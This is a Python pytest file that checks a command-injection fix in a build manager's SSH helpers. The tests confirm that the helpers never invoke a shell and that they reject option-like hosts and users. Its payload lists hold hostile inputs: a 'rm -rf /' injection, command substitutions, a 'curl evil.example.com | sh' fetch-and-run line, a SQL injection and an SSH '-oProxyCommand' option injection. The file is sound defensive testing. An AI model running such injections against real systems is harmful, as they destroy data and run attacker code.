"""Stage 1 of the Build Manager hardening plan — command-injection fix.

test_ssh_connectivity / _get_host_fingerprint / generate_ssh_keypair used to
build shell command strings via f-string interpolation and run them with
create_subprocess_shell — a command-injection vector via attacker-controlled
BMHost.host/port/user fields. These tests confirm the fixed version never
invokes a shell and treats malicious input as an inert, literal argv element.
"""
from unittest.mock import AsyncMock, patch

import pytest

from app.services.build_manager import (
    test_ssh_connectivity as check_ssh_connectivity,
    _get_host_fingerprint, generate_ssh_keypair, _rejects_as_ssh_option,
)


def _fake_process(returncode=0, communicate_result=(b"OK", b"")):
    proc = AsyncMock()
    proc.returncode = returncode
    proc.communicate = AsyncMock(return_value=communicate_result)
    return proc


@pytest.mark.parametrize("payload", [
    "; rm -rf / #",
    "$(whoami)",
    "`id`",
    "host && curl evil.example.com | sh",
    "host'; DROP TABLE users; --",
])
async def test_ssh_connectivity_never_uses_a_shell(payload):
    with patch("app.services.build_manager.asyncio.create_subprocess_shell") as shell_mock, \
         patch("app.services.build_manager.asyncio.create_subprocess_exec", new_callable=AsyncMock) as exec_mock:
        exec_mock.return_value = _fake_process()
        result = await check_ssh_connectivity(payload, port=22, user="root", timeout=1)

    shell_mock.assert_not_called()
    assert exec_mock.called
    # First call is the connectivity check itself; on success it goes on to
    # call _get_host_fingerprint, which calls create_subprocess_exec again.
    args = exec_mock.call_args_list[0].args
    assert "ssh" == args[0]
    # The payload must appear as a single, literal argv element (e.g. inside
    # "root@<payload>") — never concatenated into a shell command string.
    joined_as_shell_string = " ".join(args)
    assert payload in joined_as_shell_string  # present literally
    # None of the argv elements themselves got split/expanded by a shell —
    # confirm each arg is one of the expected literal tokens or contains the
    # payload wholesale (not fragments of it mixed with other args).
    matching = [a for a in args if payload in a]
    assert len(matching) == 1
    assert matching[0] == f"root@{payload}"
    assert result.success is True


@pytest.mark.parametrize("bad_value", ["-oProxyCommand=evil", "--", "-1.2.3.4"])
async def test_ssh_connectivity_rejects_option_like_host(bad_value):
    with patch("app.services.build_manager.asyncio.create_subprocess_exec", new_callable=AsyncMock) as exec_mock:
        result = await check_ssh_connectivity(bad_value, port=22, user="root", timeout=1)
    exec_mock.assert_not_called()
    assert result.success is False


async def test_ssh_connectivity_rejects_option_like_user():
    with patch("app.services.build_manager.asyncio.create_subprocess_exec", new_callable=AsyncMock) as exec_mock:
        result = await check_ssh_connectivity("host.example.com", user="-oProxyCommand=evil")
    exec_mock.assert_not_called()
    assert result.success is False


async def test_get_host_fingerprint_never_uses_a_shell():
    payload = "; rm -rf / #"
    keyscan_proc = _fake_process(communicate_result=(b"host ssh-ed25519 AAAA...\n", b""))
    keygen_proc = _fake_process(communicate_result=(b"256 SHA256:abc123 host (ED25519)\n", b""))

    with patch("app.services.build_manager.asyncio.create_subprocess_shell") as shell_mock, \
         patch("app.services.build_manager.asyncio.create_subprocess_exec", new_callable=AsyncMock) as exec_mock:
        exec_mock.side_effect = [keyscan_proc, keygen_proc]
        result = await _get_host_fingerprint(payload, 22)

    shell_mock.assert_not_called()
    first_call_args = exec_mock.call_args_list[0].args
    assert first_call_args[0] == "ssh-keyscan"
    assert payload in first_call_args
    assert result == "SHA256:abc123"


async def test_get_host_fingerprint_rejects_option_like_host():
    with patch("app.services.build_manager.asyncio.create_subprocess_exec", new_callable=AsyncMock) as exec_mock:
        result = await _get_host_fingerprint("-oProxyCommand=evil", 22)
    exec_mock.assert_not_called()
    assert result is None


async def test_generate_ssh_keypair_never_uses_a_shell(tmp_path, monkeypatch):
    key_path = tmp_path / "id_ed25519"
    monkeypatch.setattr("app.services.build_manager.SSH_KEY_PATH", key_path)

    def _write_keys(*args, **kwargs):
        key_path.write_text("private")
        key_path.with_suffix(".pub").write_text("ssh-ed25519 AAAA... buildmanager@certmanager\n")
        return _fake_process(communicate_result=(b"", b""))

    with patch("app.services.build_manager.asyncio.create_subprocess_shell") as shell_mock, \
         patch("app.services.build_manager.asyncio.create_subprocess_exec", new_callable=AsyncMock) as exec_mock:
        exec_mock.side_effect = _write_keys
        await generate_ssh_keypair()

    shell_mock.assert_not_called()
    args = exec_mock.call_args.args
    assert args[0] == "ssh-keygen"
    assert str(key_path) in args


def test_rejects_as_ssh_option():
    assert _rejects_as_ssh_option("-oProxyCommand=evil") is True
    assert _rejects_as_ssh_option("--") is True
    assert _rejects_as_ssh_option("host.example.com") is False
    assert _rejects_as_ssh_option("10.0.0.1") is False
